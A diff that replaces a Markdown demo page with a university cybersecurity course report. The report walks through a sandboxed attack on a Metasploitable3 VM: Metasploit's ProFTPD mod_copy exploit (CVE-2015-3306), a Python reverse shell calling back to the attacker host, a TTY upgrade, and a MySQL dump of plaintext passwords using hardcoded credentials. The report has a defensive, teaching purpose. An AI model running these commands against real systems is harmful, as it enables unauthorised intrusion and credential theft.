@@ -1,710 +1,164 @@
-# My Open Publishing Space
+# Cybersecurity Demo: ProFTPD Exploitation and MySQL Plaintext Data Exfiltration
 
-## Create, Share and Collaborate
-
-![Photo of Mountain](images/mountain.jpg)
-
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
-
-## Introduction
-
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
-
-![Figure 1: The Markdown Mark](images/markdown-red.png)
-
-Some of the key benefits are:
-
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
-
-John Gruber[^1], the author of Markdown, puts it like this:
-
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
-
-
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
-
-### Headings
-
-Headings from `h1` through `h6` are constructed with a `#` for each level:
-
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
-```
-
-Renders to:
-
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
-
-HTML:
-
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
-```
-
-### Comments
-
-Comments should be HTML compatible
-
-```html
-<!--
-This is a comment
--->
-```
-Comment below should **NOT** be seen:
-
-<!--
-This is a comment
--->
-
-### Horizontal Rules
-
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
-
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
-
-renders to:
-
-___
+**Course:** Cybersecurity  
+**University:** Università degli Studi di Trieste  
+**Video Demo:** https://youtu.be/GFJoJC5dhOM
 
 ---
 
-***
+## 1. Introduction and Threat Model
 
+This report details a multi-stage attack chain executed within a controlled sandbox environment. The infrastructure consists of a **Kali Linux** attacker instance and a **Metasploitable3 (Linux)** target, both segregated within a private virtual network (**VirtualBox NatNetwork**) to ensure complete isolation and bidirectional reachability.
 
-### Body Copy
+In accordance with the course framework, the assessment is based on the following **Threat Model**:
+* **Attacker Profile:** A Network Attacker positioned within the target's local subnet.
+* **Initial Capabilities:** The adversary is completely **unauthenticated** (zero starting privileges, no legitimate accounts, no baseline credentials).
+* **Objective:** Achieve Remote Command Execution (RCE) to compromise the server's perimeter and exfiltrate sensitive enterprise data, critically impacting the **Confidentiality** and **Integrity** of the system.
 
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
+To provide an autonomous and significant variation from standard laboratory exercises (e.g., avoiding basic brute-forcing via Hydra), this demo exploits the logical interaction between two distinct network daemons: abusing an FTP server vulnerability to drop a payload that is subsequently executed by a Web Server.
 
-So this body copy:
+## 2. Network Reconnaissance and Discovery
 
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
+The operation begins in a black-box scenario. Following the **Discovery** tactic of the MITRE ATT&CK matrix, active devices in the local broadcast domain are mapped using an ARP sweep:
+
+```bash
+sudo arp-scan -l
 ```
-renders to this HTML:
+![Figure 1: ARP sweep and target isolation](screenshot1.png)
 
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
+Based on the standard VirtualBox NatNetwork architecture, the IP addresses `10.0.2.1` (host loopback interface) and `10.0.2.2` (NAT gateway router) are systematically excluded as structural virtualization infrastructure components. Consequently, the actual operational target host is uniquely identified at IP address `10.0.2.15`.
+
+After confirming baseline logical layer-3 network reachability via ICMP ping validation, a comprehensive TCP port and service version validation scan is performed to fully enumerate the target machine's active network perimeter surface:
+
+```bash
+nmap -sV -p- 10.0.2.15
 ```
+![Figure 2: Nmap service discovery](screenshot2.png)
 
-### Emphasis
+The comprehensive environment probe execution identifies multiple exposed application access endpoints. The core technical analysis focuses strictly on two specific unauthenticated exposed network daemons: **ProFTPD 1.3.5** running natively on control port 21, and an **Apache httpd 2.4.7** infrastructure web daemon handling traffic on standard HTTP port 80.
 
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
+## 3. Initial Access and Shell Stabilization
 
-The following snippet of text is **rendered as bold text**.
+The attack path progresses from reconnaissance to the **Initial Access** tactic (MITRE ATT&CK), specifically targeting the exposed FTP service via Metasploit Framework.
 
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
+```bash
+msfconsole
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS 10.0.2.15
 ```
 
-renders to:
+The selected module weaponizes **CVE-2015-3306**, a critical vulnerability residing in ProFTPD's `mod_copy` component. This flaw stems from an insecure default configuration where the `SITE NEW` and `SITE CPTO` commands are exposed to unauthenticated remote clients. This design failure allows an adversary to execute arbitrary file copy commands across the target's underlying file system without providing valid system credentials, violating the fundamental principle of **Complete Mediation** (Saltzer and Schroeder).
 
-_rendered as italicized text_
+To establish an interactive control channel, a Python-based reverse shell payload is configured:
 
-and this HTML:
-
-```html
-<em>rendered as italicized text</em>
+```bash
+set payload cmd/unix/reverse_python
 ```
 
+Selecting a Python payload instead of a generic netcat execution ensures stability and prevents immediate session termination under Linux multi-threading process constraints. To configure the callback parameter (`LHOST`), a separate terminal panel is used to inspect the local network interfaces:
 
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
-
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
-
-~~Strike through this text.~~
-
-HTML:
-
-```html
-<del>Strike through this text.</del>
+```bash
+ip a
 ```
 
-### Blockquotes
-For quoting blocks of content from another source within your document.
+The local IP address is determined to be `10.0.2.3`. Returning to the Metasploit console, the listener and the target URI root paths are updated before launching the unauthenticated exploitation attempt:
 
-Add `>` before any text you want to quote.
+```bash
+set LHOST 10.0.2.3
+set TARGETURI /
+show options
+exploit
+```
+![Figure 3: Failed exploit attempt due to directory permissions](screenshot3.png)
 
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
+As documented in the video demo, the initial execution terminates with a failure condition: `Failure copying PHP payload, directory not writable?`. This obstruction represents a standard real-world vulnerability management and asset context scenario (as highlighted in CVSS environmental assessments). The exploit module’s default configuration attempts to write the PHP payload into the standard Linux web root path `/var/www`. However, local system Access Control Lists (ACLs) restrict the write permissions of the `proftpd` daemon process over that specific folder.
+
+To bypass this restriction and align the attack path with the actual operational environment of the target Ubuntu server, the destination directory is explicitly configured to the proper public web root:
+
+```bash
+set SITEPATH /var/www/html
+exploit
 ```
 
-Renders to:
+The second execution succeeds. The ProFTPD daemon successfully copies the PHP payload into the web directory via the vulnerable module, and Metasploit subsequently triggers its remote execution via an HTTP request over port 80, spawning a reverse shell session.
 
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
+![Figure 4: Successful exploitation and session opening](screenshot4.png)
 
-and this HTML:
+### Shell Stabilization (TTY Upgrade)
 
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
+The established connection drops the attacker into a raw, non-interactive shell socket. This interface lacks a standard pseudo-terminal (TTY) allocation, missing basic operational features like tab-completion, history tracking, or job control signals. To upgrade and stabilize the session, an interactive bash instance is spawned using the target's Python interpreter:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Blockquotes can also be nested:
+Following the TTY upgrade, process context commands are issued to determine the exact security boundaries of the compromised session:
 
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
+```bash
+whoami
+id
 ```
+![Figure 5: Shell stabilization and process identification](screenshot5.png)
 
-Renders to:
+The output reveals code execution under the identity of the `www-data` system service user account. This demonstrates a proper implementation of the **Least Privilege** principle at the operating system level: the web server process runs under a restricted daemon account rather than high-privileged root authority, containing the initial radius of the perimeter breach.
 
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
+## 4. Credential Access and Data Exfiltration
 
-### Lists
+Operating under the restricted `www-data` context, an attempt at vertical privilege escalation is made by enumerating available `sudo` capabilities:
 
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
-
-You may use any of the following symbols to denote bullets for each list item:
-
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
+```bash
+sudo -l
 ```
+![Figure 6: Failed vertical privilege escalation attempt via sudo](screenshot6.png)
 
-For example
+The execution fails, prompting for the `www-data` password, which is unknown. This failure indicates that local administrative access is strongly protected and cannot be trivially acquired via default `sudo` misconfigurations.
 
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
+Pivoting to the **Collection** and **Credential Access** tactics, the focus shifts to the application layer. By navigating the local web directory `/var/www/html`, the source code of a custom PHP application named `payroll_app.php` is identified and statically analyzed:
+
+```bash
+cat payroll_app.php
 ```
-Renders to:
+![Figure 7: Hardcoded credentials discovery in PHP source](screenshot7.png)
 
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
+The static code review exposes a critical architectural flaw: the database connection strings are embedded directly within the application's source code in cleartext (`root` / `sploitme`). This practice of Hardcoded Credentials drastically lowers the effort required to compromise the backend database. Furthermore, the PHP script constructs SQL queries dynamically by concatenating unsanitized user input (`$_POST['username']`), creating a direct vector for SQL Injection (SQLi) vulnerabilities.
 
-And this HTML
+Capitalizing on the hardcoded credentials, authentication to the local instance of the MySQL daemon natively deployed on the target host (`127.0.0.1`) is successful. A lateral collection query is executed to dump the content of the `users` table residing within the `payroll` database:
 
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
+```bash
+mysql -h 127.0.0.1 -u root -p'sploitme' -e "SELECT * FROM payroll.users;"
 ```
+![Figure 8: MySQL database dump and plaintext data exfiltration](screenshot8.png)
 
-#### Ordered
+The command execution successfully exfiltrates the complete list of system usernames alongside their respective operational passwords. The output demonstrates the ultimate severity of the attack: user passwords are functionally stored and retrieved in absolute **Plaintext**.
 
-A list of items in which the order of items does explicitly matter.
+As discussed during the course lectures on Authentication and Password Storage, saving plaintext credentials represents a total defensive failure. In a mature environment, password storage mechanisms must employ robust, slow cryptographic hashing functions (e.g., *bcrypt*, *Argon2*) combined with unique, random per-user *salts*. Proper storage ensures that even if the primary boundary is breached (as demonstrated via ProFTPD) and the database is dumped, the exfiltrated credential material remains computationally infeasible to reverse and reuse.
 
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
+---
 
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
+## References and Sources
 
-And this HTML:
+The design, lab setup, and deployment of this vulnerability demonstration were compiled using the following official documentation, vulnerability databases, and open-source intelligence (OSINT) resources:
 
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
+1. **National Vulnerability Database (NVD) - CVE-2015-3306 Detail** Official security advisory and CVSS base score parameters for the ProFTPD `mod_copy` information disclosure and arbitrary file copy flaw.  
+   Ref: [https://nvd.nist.gov/vuln/detail/CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
 
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
+2. **Rapid7 Metasploit Module Documentation** Technical specifications and usage guide for the `exploit/unix/ftp/proftpd_modcopy_exec` integration module.  
+   Ref: [https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/)
 
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
+3. **Rapid7 Metasploitable3 Open-Source Project** Source repository, build scripts, and environmental baseline details for the automated Metasploitable3 Linux target virtual appliance.  
+   Ref: [https://github.com/rapid7/metasploitable3](https://github.com/rapid7/metasploitable3)
 
-Renders to:
+4. **Exploit-DB - ProFTPD 1.3.5 - 'mod_copy' Remote Command Execution** Public proof-of-concept (PoC) reference script exploring the unauthenticated execution vector via web-root payload injection.  
+   Ref: [https://www.exploit-db.com/exploits/36742](https://www.exploit-db.com/exploits/36742)
 
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
+5. **OWASP Top 10:2021 – Cryptographic Failures & Insecure Storage** Defensive architecture guidelines regarding the mitigation of cleartext credential persistence and plaintext application data exfiltration.  
+   Ref: [https://owasp.org/Top10/A02_2021-Cryptographic_Failures/](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
 
-### Code
+---
 
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
+## AI Usage Disclosure
 
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
+In compliance with academic integrity guidelines, the use of generative AI tools during the preparation of this project is disclosed as follows:
 
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
-
-```
-Sample text here...
-```
-
-HTML:
-
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
-```
-
-#### Syntax highlighting
-
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
-
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
-
-Renders to:
-
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
-
-
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-Renders to:
-
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-And this HTML:
-
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
-```
-
-### Right aligned text
-
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
-
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-### Links
-
-#### Basic link
-
-```markdown
-[Assemble](http://assemble.io)
-```
-
-Renders to (hover over the link, there is no tooltip):
-
-[Assemble](http://assemble.io)
-
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
-```
-
-
-#### Add a title
-
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-```
-
-Renders to (hover over the link, there should be a tooltip):
-
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-
-HTML:
-
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
-```
-
-#### Named Anchors
-
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
-```
-will jump to these sections:
-
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
-
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
-```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
-
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
-
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
-```
-![Image of Minion](https://octodex.github.com/images/minion.png)
-
-and using a local image (which also displays in GitHub):
-
-```markdown
-![Image of Octocat](images/octocat.jpg)
-```
-![Image of Octocat](images/octocat.jpg)
-
-## Topic One  
-
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
-
-## Topic Two
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-## Topic Three
-
-### Overview
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-### Subtopic One
-
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
-
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
-
-#### Fuit tela Caesareos tamen per balatum
-
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
-
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
-
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
-
-#### Colit potiora ungues plumeus de glomerari num
-
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
-
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
-
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
-
-### Subtopic Two
-
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
-
-#### Et omnis blanda fetum ortum levatus altoque
-
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
-
-#### Et hanc
-
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
-
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
-
-#### Adulterium tamen instantiaque puniceum et formae patitur
-
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
-
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
-
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
-
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
-
-[^1]: [Markdown - John Gruber](https://daringfireball.net/projects/markdown/)
+* **Drafting and Writing:** Large Language Models (LLMs) were used during the drafting phase of this report to refine English grammar, syntax, and academic sentence structure based on my initial notes and technical outline.
+* **Technical Execution:** The laboratory setup and the actual live attack path shown in the video were executed entirely by me. AI assistants were utilized exclusively during the preparation phase to research specific command-line syntax, help troubleshoot configuration adjustments (such as diagnosing web directory write restrictions), and resolve conceptual questions. No interactive or automated AI tools were active during the live demonstration.
